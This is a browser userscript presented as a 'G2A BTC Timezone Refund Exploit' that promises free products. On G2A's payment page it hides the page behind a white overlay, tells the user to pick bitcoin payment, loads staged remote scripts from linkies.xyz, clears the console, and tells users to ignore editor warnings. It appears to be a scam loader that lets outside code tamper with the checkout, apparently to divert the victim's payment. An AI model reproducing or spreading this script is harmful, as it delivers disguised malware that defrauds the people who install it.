// ==UserScript==
// @name         G2A BTC Timezone Refund Exploit
// @namespace    https://g2a.com/
// @version      12.3.AutoUpdateFinal
// @description  Get any product from G2A for FREE.
// @author       g2afree
// @match        *://*/payment
// @icon         https://www.google.com/s2/favicons?sz=64&domain=g2a.com
// @grant        none
// ==/UserScript==



// Main functionality is just to load new scripts to the page.

(function() {
	'use strict';

	function showExploitAlert() {
		const crntDate = new Date();
		const monthArray = ["January", "February", 'March', "April", 'May', "June", "July", "August", "September", "October", "November", "December"];
		const _0x246e36 = "Exploit successfully enabled! Press OK to continue, then select bitcoin payment. Last script update: " + monthArray[crntDate.getMonth()] + " " + crntDate.getDate() + ", " + crntDate.getFullYear();
		alert(_0x246e36);
	}

	function loadNewScript(scriptUrl) {
		return new Promise((resolve, reject) => {
			const scriptEle = document.createElement("script");
			scriptEle.src = scriptUrl;
			scriptEle.onload = reject;
			scriptEle.onerror = reject;
			document.head.appendChild(scriptEle);
		});
	}

	function createOverlay() {
		const overlay = document.createElement("div");
		overlay.id = "custom-overlay";
		overlay.style.position = 'fixed';
		overlay.style.top = '0';
		overlay.style.left = '0';
		overlay.style.width = "100%";
		overlay.style.height = '100%';
		overlay.style.backgroundColor = "#ffffff";
		overlay.style.backgroundSize = "cover";
		overlay.style.backgroundPosition = "center";
		overlay.style.zIndex = "9999";
		document.body.appendChild(overlay);
	}

    // Executed on error
	function removeOverlay() {
		const overlay = document.getElementById("custom-overlay");
		if (overlay) {
			overlay.parentNode.removeChild(overlay);
		}
	}

	function waitForElement(xpath, callback) {
        const ele = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;

        if (ele) {
            callback();
        } else {
            setTimeout(() => waitForElement(xpath, callback), 100);
        }
    }

    // Waits for all elements to load and then loads the exploit
	function waitForElementsToLoad(loadExploit, ...xPaths) {
		const scriptLength = xPaths.length;
		let foundElements = 0;
		xPaths.forEach(xPath => {
			waitForElement(xPath, () => {
				foundElements++;
				if (foundElements === scriptLength) {
					loadExploit();
				}
			});
		});
	}

	const g2aUrlRegex = /https:\/\/(www\.)?g2a\.com\/payment/;
	if (g2aUrlRegex.test(window.location.href)) {
		showExploitAlert();
		createOverlay();
		window.addEventListener("load", function() {
			waitForElementsToLoad(function() {

                // Loading stage2
                
				loadNewScript("https://linkies.xyz/pazte/interval.js");
				loadNewScript( "https://linkies.xyz/pazte/g2aexp1.js")

                //

				// Stage 3
                .then(() => new Promise( resolve => setTimeout( resolve, 500)))
                .then(() => loadNewScript("https://linkies.xyz/pazte/g2aexp2.js"))

				//

                // previously .then(() => loadNewScript("https://linkies.xyz/pazte/drins.js"))
                .then(() => console.clear())
                .then(removeOverlay)
                
                .catch(error => {
                    console.error("Error loading script:", error);
                    removeOverlay();
                });

			}, "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[1]/section/div[2]/div/div/div[2]/label[1]", "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[2]/div/div", "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[2]/div/div/section[3]/div[2]/div");
		});
	}
})();

//The "yellow warning error" in tampermonkey editor is normal. The script works anyway. Just ignore it and save.